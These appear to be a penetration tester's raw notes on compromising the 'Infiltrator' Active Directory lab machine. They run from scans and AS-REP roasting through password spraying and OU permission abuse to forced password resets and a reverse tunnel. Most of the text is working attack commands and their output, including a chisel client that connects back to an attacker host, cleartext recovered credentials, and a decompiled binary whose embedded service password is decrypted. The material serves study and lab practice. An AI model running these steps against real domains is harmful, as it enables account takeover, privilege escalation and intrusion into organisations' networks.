## HOST RECON

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
```


 =================================( Getting domain SID for 10.10.11.31 )=================================

Domain Name: INFILTRATOR
Domain Sid: S-1-5-21-2606098828-3734741516-3625406802


## USER ENUM


#### users from web page team

d.anderson
o.martinez
k.turner
a.walker
m.harris
l.clark
e.rodriguez

#### Asreproast on users

```
└─$ netexec ldap 10.10.11.31 -u users.txt -p '' --asreproast out.txt   
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)

...

LDAP        10.10.11.31     445    DC01             $krb5asrep$23$l.clark@INFILTRATOR.HTB:dec3c62c3c345acb4f3d64f84d644fde$0081416cb42e214cb2cbbf09e97e668412671f1c9d866ea24fb9e2519771edca114758383a0b0fed1d25949604cc3f9335ac66a00d332ebfb24253f15d4c008abe2c0147a4851695f81bbb11d87acb31bb0b923f9e6013f6b25d9923c49380ee27ef646387ed3a70e351bd9302aaced759bcc52815dcb0607220535b7d1ffe7a14d57cacf4094c498c861951b30c05f7eb8703f144fc01acf3bbd5a4c5f79048fb63fc32f84e7cf8f87cbe8129bccb9d367ed3d804ded7ecb24483f47812f2b34985c59222c444f286c3f5fd927920ca02541a923d259fcaa0d85c24c6ec72e3e8289ba0b5fc13796f51712c17cc34ebf070
```

#### Cracked l.clark hash

```
WAT?watismypass!
```


## L.Clark creds


#### login winrm not work

```
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
```

#### Users and Groups enum

```
└─$ netexec smb 10.10.11.31 -u l.clark -p 'WAT?watismypass!' --rid-brute
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.10.11.31     445    DC01             498: INFILTRATOR\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.31     445    DC01             500: INFILTRATOR\Administrator (SidTypeUser)
SMB         10.10.11.31     445    DC01             501: INFILTRATOR\Guest (SidTypeUser)
SMB         10.10.11.31     445    DC01             502: INFILTRATOR\krbtgt (SidTypeUser)
SMB         10.10.11.31     445    DC01             512: INFILTRATOR\Domain Admins (SidTypeGroup)
SMB         10.10.11.31     445    DC01             513: INFILTRATOR\Domain Users (SidTypeGroup)
SMB         10.10.11.31     445    DC01             514: INFILTRATOR\Domain Guests (SidTypeGroup)
SMB         10.10.11.31     445    DC01             515: INFILTRATOR\Domain Computers (SidTypeGroup)
SMB         10.10.11.31     445    DC01             516: INFILTRATOR\Domain Controllers (SidTypeGroup)
SMB         10.10.11.31     445    DC01             517: INFILTRATOR\Cert Publishers (SidTypeAlias)
SMB         10.10.11.31     445    DC01             518: INFILTRATOR\Schema Admins (SidTypeGroup)
SMB         10.10.11.31     445    DC01             519: INFILTRATOR\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.31     445    DC01             520: INFILTRATOR\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.31     445    DC01             521: INFILTRATOR\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.31     445    DC01             522: INFILTRATOR\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.31     445    DC01             525: INFILTRATOR\Protected Users (SidTypeGroup)
SMB         10.10.11.31     445    DC01             526: INFILTRATOR\Key Admins (SidTypeGroup)
SMB         10.10.11.31     445    DC01             527: INFILTRATOR\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.31     445    DC01             553: INFILTRATOR\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.31     445    DC01             571: INFILTRATOR\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.31     445    DC01             572: INFILTRATOR\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.31     445    DC01             1000: INFILTRATOR\DC01$ (SidTypeUser)
SMB         10.10.11.31     445    DC01             1101: INFILTRATOR\DnsAdmins (SidTypeAlias)
SMB         10.10.11.31     445    DC01             1102: INFILTRATOR\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.31     445    DC01             1103: INFILTRATOR\D.anderson (SidTypeUser)
SMB         10.10.11.31     445    DC01             1104: INFILTRATOR\L.clark (SidTypeUser)
SMB         10.10.11.31     445    DC01             1105: INFILTRATOR\M.harris (SidTypeUser)
SMB         10.10.11.31     445    DC01             1106: INFILTRATOR\O.martinez (SidTypeUser)
SMB         10.10.11.31     445    DC01             1107: INFILTRATOR\A.walker (SidTypeUser)
SMB         10.10.11.31     445    DC01             1108: INFILTRATOR\K.turner (SidTypeUser)
SMB         10.10.11.31     445    DC01             1109: INFILTRATOR\E.rodriguez (SidTypeUser)
SMB         10.10.11.31     445    DC01             1111: INFILTRATOR\Chiefs Marketing (SidTypeGroup)
SMB         10.10.11.31     445    DC01             1112: INFILTRATOR\Developers (SidTypeGroup)
SMB         10.10.11.31     445    DC01             1113: INFILTRATOR\Digital_Influencers (SidTypeGroup)
SMB         10.10.11.31     445    DC01             1114: INFILTRATOR\Infiltrator_QA (SidTypeGroup)
SMB         10.10.11.31     445    DC01             1115: INFILTRATOR\Marketing_Team (SidTypeGroup)
SMB         10.10.11.31     445    DC01             1116: INFILTRATOR\Service_Management (SidTypeGroup)
SMB         10.10.11.31     445    DC01             1601: INFILTRATOR\winrm_svc (SidTypeUser)
SMB         10.10.11.31     445    DC01             3102: INFILTRATOR\infiltrator_svc$ (SidTypeUser)
```

```
└─$ netexec smb 10.10.11.31 -u l.clark -p 'WAT?watismypass!' --users
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.10.11.31     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.31     445    DC01             Administrator                 2024-08-21 19:58:28 0       Built-in account for administering the computer/domain 
SMB         10.10.11.31     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.31     445    DC01             krbtgt                        2023-12-04 17:36:16 0       Key Distribution Center Service Account 
SMB         10.10.11.31     445    DC01             D.anderson                    2023-12-04 18:56:02 0        
SMB         10.10.11.31     445    DC01             L.clark                       2023-12-04 19:04:24 0        
SMB         10.10.11.31     445    DC01             M.harris                      2024-12-18 03:31:44 0        
SMB         10.10.11.31     445    DC01             O.martinez                    2024-02-25 15:41:03 1        
SMB         10.10.11.31     445    DC01             A.walker                      2023-12-05 22:06:28 1        
SMB         10.10.11.31     445    DC01             K.turner                      2024-02-25 15:40:35 1       MessengerApp@Pass! 
SMB         10.10.11.31     445    DC01             E.rodriguez                   2024-12-18 03:31:44 0        
SMB         10.10.11.31     445    DC01             winrm_svc                     2024-08-02 22:42:45 0        
SMB         10.10.11.31     445    DC01             lan_managment                 2024-08-02 22:42:46 0        
SMB         10.10.11.31     445    DC01             [*] Enumerated 12 local users: INFILTRATOR
```

```
└─$ netexec smb 10.10.11.31 -u users.txt -p 'MessengerApp@Pass!' 
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\administrator:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\guest:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\krbtgt:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\d.anderson:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\o.martinez:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\k.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\a.walker:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\m.harris:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\l.clark:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\e.rodriguez:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\winrm_svc:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\lan_managment:MessengerApp@Pass! STATUS_LOGON_FAILURE
```

```
└─$ ./kerbrute passwordspray --dc 10.10.11.31 -d infiltrator.htb users.txt 'WAT?watismypass!'

...

2024/12/18 22:05:03 >  [+] VALID LOGIN:  l.clark@infiltrator.htb:WAT?watismypass!
2024/12/18 22:05:03 >  [+] VALID LOGIN:  d.anderson@infiltrator.htb:WAT?watismypass!
```


## BloodHound

```
└─$ bloodhound-python --zip -c All -d infiltrator.htb -u l.clark -p 'WAT?watismypass!' -ns 10.10.11.31
INFO: Found AD domain: infiltrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 14 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.infiltrator.htb
INFO: Done in 00M 33S
INFO: Compressing output into 20241217230517_bloodhound.zip
```

#### L.Clark

```
l.clark ---> Member of ---> USERS, DOMAIN USERS, MARKETING_TEAM
No outbound 
```

```
Marketing_team ---> Members ---> l.clark, d.anderson 
```

#### D.Anderson

```
d.anderson ---> Member of ---> USERS, DOMAIN USERS, PROTECTED USERS, MARKETING_TEAM
|__ GenericAll ---> MARKETING DIGITAL OU
```
- https://github.com/synacktiv/OUned
- https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory

```
Control of the Organization Unit

With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:

Generic Descendent Object Takeover

The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'

Now, the "JKOHLER" user will have full control of all descendent objects of each type.

Targeted Descendent Object Takeoever

If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this.

Objects for which ACL inheritance is disabled

It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs.

In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them.

Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup.

From a Linux machine, the gPLink manipulation attack vector may be exploited using the OUned.py tool. For a detailed outline of exploit requirements and implementation, you can refer to the article associated to the OUned.py tool.

Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO.

Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands.
```

```
MARKETING DIGITAL OU ---> Contains ---> e.rodriguez
						  |__ Permissions on the parent of a child object may enable compromise of the child object through inherited ACEs or linked GPOs. See the inbound edges on the parent object for details.
```

- https://wald0.com/?p=179
- https://blog.cptjesus.com/posts/bloodhound15

### E.Rodriguez

```
e.rodriguez ---> Member of ---> USERS, DOMAIN USERS, DIGITAL_INFLUENCERS
|___ AddSelf ---> CHIEFS MARKETING
```

```
CHIEFS MARKETING ---> Members ---> a.walker, o.martinez
|___ Force Change Password ---> m.harris 
```

### M.Harris

```
m.harris ---> Member of ---> USERS, DOMAIN USERS, PROTECTED USERS, REMOTE MANAGEMENT USERS, DEVELOPERS
inbound with CHIEFS MARKETING group
```



## Generic Descendent Object Takeover (d.anderson genericall over OU)

- https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory
- https://www.adamcouch.co.uk/dacl-trouble-genericall-on-ous/

#### with d.anderson password not working. Need get ccache.

```
└─$ impacket-getTGT -dc-ip 10.10.11.31 'infiltrator.htb/d.anderson:WAT?watismypass!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in d.anderson.ccache



└─$ export KRB5CCNAME=d.anderson.ccache                      
```

```
└─$ impacket-dacledit -dc-ip 10.10.11.31 -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass

...

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20241219-001750.bak
[*] DACL modified successfully!
```

#### After this d.anderson has GenericAll over members of OU in this case e.rodriguez (collect bloodhound data again to see)

```
d.anderson ---> GenericAll ---> e.rodriguez
				|__ Marketing Digital OU

outbound --->  Targeted Kerberoast,  Force Change Password, Shadow Credentials attack 
```

## Force Change Password in e.rodriguez works (with d.anderson ccache file)

- https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword

```
└─$ bloodyAD --dc-ip 10.10.11.31 --host dc01.infiltrator.htb -d infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -k set password e.rodriguez 'Password@123'
[+] Password changed successfully!
```

## e.rodriguez AddSelf over Chiefs Marketing group

- https://www.thehacker.recipes/ad/movement/dacl/addmember#addmember

```
└─$ bloodyAD --dc-ip 10.10.11.31 --host dc01.infiltrator.htb -d infiltrator.htb -u e.rodriguez -p 'Password@123' add groupMember 'chiefs marketing' e.rodriguez
[+] e.rodriguez added to chiefs marketing
```

```
└─$ netexec ldap 10.10.11.31 -u l.clark -p 'WAT?watismypass!' --query "(sAMAccountName=e.rodriguez)" ""
...
LDAP        10.10.11.31     389    DC01             cn:                  E.rodriguez
LDAP        10.10.11.31     389    DC01             title:               Digital Influencer
LDAP        10.10.11.31     389    DC01             telephoneNumber:     +0 123 443 699
LDAP        10.10.11.31     389    DC01             distinguishedName:   CN=E.rodriguez,OU=Marketing Digital,DC=infiltrator,DC=htb
LDAP        10.10.11.31     389    DC01             instanceType:        4
LDAP        10.10.11.31     389    DC01             whenCreated:         20231204185643.0Z
LDAP        10.10.11.31     389    DC01             whenChanged:         20241220043353.0Z
LDAP        10.10.11.31     389    DC01             uSNCreated:          20570
LDAP        10.10.11.31     389    DC01             memberOf:            CN=Digital_Influencers,CN=Users,DC=infiltrator,DC=htb CN=Chiefs Marketing,CN=Users,DC=infiltrator,DC=htb   <----
LDAP        10.10.11.31     389    DC01             uSNChanged:          303319
LDAP        10.10.11.31     389    DC01             department:          Digital Influencer Marketing
LDAP        10.10.11.31     389    DC01             name:                E.rodriguez
```


## e.rodriguez Force Change Password over m.harris

```
└─$ bloodyAD --dc-ip 10.10.11.31 --host dc01.infiltrator.htb -d infiltrator.htb -u e.rodriguez -p 'Password@123' set password m.harris 'Password@123'                     
[+] Password changed successfully!
```

#### m.harris is part of REMOTE MANAGEMENT USERS 

#### Connect with clear text creds not work

```
└─$ evil-winrm -i 10.10.11.31 -u m.harris -p 'Password@123'

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
```

#### Connect with kerberos auth

```
└─$ impacket-getTGT -dc-ip 10.10.11.31 'infiltrator.htb/m.harris:Password@123'

└─$ export KRB5CCNAME=m.harris.ccache                    

└─$ cat /etc/krb5.conf
        INFILTRATOR.HTB = {
                kdc = dc01.infiltrator.htb
        }
└─$ cat /etc/hosts
10.10.11.31 dc01.infiltrator.htb infiltrator.htb

 
└─$ evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb
```

## Login as m.harris

- No outbound path

```
*Evil-WinRM* PS C:\Users\M.harris> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ==============================================
infiltrator\m.harris S-1-5-21-2606098828-3734741516-3625406802-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
INFILTRATOR\Protected Users                 Group            S-1-5-21-2606098828-3734741516-3625406802-525  Mandatory group, Enabled by default, Enabled group
INFILTRATOR\Developers                      Group            S-1-5-21-2606098828-3734741516-3625406802-1112 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```
*Evil-WinRM* PS C:\Users\M.harris\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.31
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

#### winpeas

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                                                             
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               88            0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         916             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         916             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         296             svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2260            Microsoft.ActiveDirectory.WebServices
  TCP        0.0.0.0               14118         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14119         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14121         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14122         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14123         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               14125         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               14126         0.0.0.0               0               Listening         6628            outputmessenger_httpd
  TCP        0.0.0.0               14127         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14128         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14130         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14406         0.0.0.0               0               Listening         7792            outputmessenger_mysqld
  TCP        0.0.0.0               15223         0.0.0.0               0               Listening         7204            OutputMessenger
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         484             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1216            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1740            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         2380            svchost
  TCP        0.0.0.0               49686         0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               49689         0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               49692         0.0.0.0               0               Listening         628             lsass
  TCP        0.0.0.0               49701         0.0.0.0               0               Listening         608             services
  TCP        0.0.0.0               49722         0.0.0.0               0               Listening         2892            dns
  TCP        0.0.0.0               49735         0.0.0.0               0               Listening         2660            certsrv
  TCP        0.0.0.0               49877         0.0.0.0               0               Listening         792             dfsrs
  TCP        10.10.11.31           53            0.0.0.0               0               Listening         2892            dns
  TCP        10.10.11.31           139           0.0.0.0               0               Listening         4               System
  TCP        10.10.11.31           389           10.10.11.31           61648           Established       628             lsass
  TCP        10.10.11.31           389           10.10.11.31           61690           Established       628             lsass
  TCP        10.10.11.31           389           10.10.11.31           61697           Established       628             lsass
```

#### powerview

```
ObjectDN                : CN=M.harris,CN=Users,DC=infiltrator,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : 00299570-246d-11d0-a768-00aa006e0529
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2606098828-3734741516-3625406802-1111
IdentityReferenceName   : Chiefs Marketing
IdentityReferenceDomain : infiltrator.htb
IdentityReferenceDN     : CN=Chiefs Marketing,CN=Users,DC=infiltrator,DC=htb
IdentityReferenceClass  : group
```



#### Reverse port forward to expose local app in target machine

- https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/#reverse-port-forwarding

```
  TCP        0.0.0.0               14118         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14119         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14121         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14122         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14126         0.0.0.0               0               Listening         6628            outputmessenger_httpd
  TCP        0.0.0.0               14127         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14128         0.0.0.0               0               Listening         584             OMServerService
  TCP        0.0.0.0               14130         0.0.0.0               0               Listening         584             OMServerService
```

#### 1 - download and install client outputmessenger for linux

- https://www.outputmessenger.com/lan-messenger-downloads/
- https://support.outputmessenger.com/ubuntu-lan-messenger/

#### 2 - local machine (attacker)

```
└─$ ./chisel_1.10.1_linux_amd64 server -p 1234 --reverse                      
2024/12/22 18:51:01 server: Reverse tunnelling enabled
2024/12/22 18:51:01 server: Fingerprint H1qDuUtEV++x5HQvx0mftuRhnRT5UVxqIJ853PhtMdU=
2024/12/22 18:51:01 server: Listening on http://0.0.0.0:1234
2024/12/22 19:00:31 server: session#1: tun: proxy#R:14121=>14121: Listening
print H1qDuUtEV++x5HQvx0mftuRhnRT5UVxqIJ853PhtMdU=
2024/12/22 18:51:01 server: Listening on http://0.0.0.0:1234
2024/12/22 19:00:31 server: session#1: tun: proxy#R:14121=>14121: Listening
```

#### 3 - remote (target)
```
*Evil-WinRM* PS C:\Users\M.harris\Documents> .\chisel.exe client 10.10.14.144:1234 R:14118:127.0.0.1:14118 R:14119:127.0.0.1:14119 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126 R:14127:127.0.0.1:14127 R:14128:127.0.0.1:14128 R:14130:127.0.0.1:14130
chisel.exe : 2024/12/22 16:00:32 client: Connecting to ws://10.10.14.144:1234
    + CategoryInfo          : NotSpecified: (2024/12/22 16:0....10.14.144:1234:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2024/12/22 16:00:33 client: Connected (Latency 172.3137ms)
```

#### 4 - log into outputmessenger with k.turner creds

```
USER = K.turner  
PASS = MessengerApp@Pass!
SERVER = 127.0.0.1
```

## Login outputmessenger k.turner user

```
Winrm_svc 
21 Feb 08:24 AM    

Security Alert! Pre-Auth Disabled on kerberos for Some Users

Hey team,

We've identified a security concern: some users and our domain (dc01.infiltrator.htb) have pre-authentication disabled on kerberos. 
No need to panic! Our vigilant team is already on it and will work diligently to fix this. In the meantime, stay vigilant and be cautious about any potential security risks. 
```

#### go to "My Wall" and find creds of m.harris

```
UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris
```

#### pass spray noting

```
2024/12/23 13:58:25 >  [+] VALID LOGIN:  m.harris@infiltrator.htb:D3v3l0p3r_Pass@1337!
```


## Login outputmessenger m.harris user

```
USER = M.harris
PASS = D3v3l0p3r_Pass@1337!
SERVER = 127.0.0.1
```

#### In chat with Admin user has a UserExplorer.exe file

- Decompile C# exe with https://github.com/icsharpcode/AvaloniaILSpy

```csharp
private static void Main(string[] args)
{
	//IL_0129: Unknown result type (might be due to invalid IL or missing references)
	//IL_0130: Expected O, but got Unknown
	//IL_013c: Unknown result type (might be due to invalid IL or missing references)
	//IL_0143: Expected O, but got Unknown
	string text = "LDAP://dc01.infiltrator.htb";
	string text2 = "";
	string text3 = "";
	string text4 = "";
	string text5 = "winrm_svc";
	string cipherText = "TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=";
	for (int i = 0; i < args.Length; i += 2)
	{
		switch (args[i].ToLower())
		{
		case "-u":
			text2 = args[i + 1];
			break;
		case "-p":
			text3 = args[i + 1];
			break;
		case "-s":
			text4 = args[i + 1];
			break;
		case "-default":
			text2 = text5;
			text3 = Decryptor.DecryptString("b14ca5898a4e4133bbce2ea2315a1916", cipherText);
			break;
		default:
			Console.WriteLine($"Invalid argument: {args[i]}");
			return;
		}
	}
	if (string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(text3) || string.IsNullOrEmpty(text4))
	{
		Console.WriteLine("Usage: UserExplorer.exe -u <username> -p <password>  -s <searchedUsername> [-default]");
		Console.WriteLine("To use the default credentials: UserExplorer.exe -default -s userToSearch");
		return;
	}
```

#### Decrypted AES text

```
WinRm@$svc^!^P
```

#### pass spray

```
2024/12/24 13:34:04 >  [+] VALID LOGIN:  winrm_svc@infiltrator.htb:WinRm@$svc^!^P
2024/12/24 13:34:04 >  Done! Tested 13 logins (1 successes) in 0.887 seconds
```

## Login as winrm_svc

- No outbound path

```
*Evil-WinRM* PS C:\Users\winrm_svc> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
infiltrator\winrm_svc S-1-5-21-2606098828-3734741516-3625406802-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
INFILTRATOR\Service_Management              Group            S-1-5-21-2606098828-3734741516-3625406802-1116 Mandatory group, Enabled by default, Enabled group
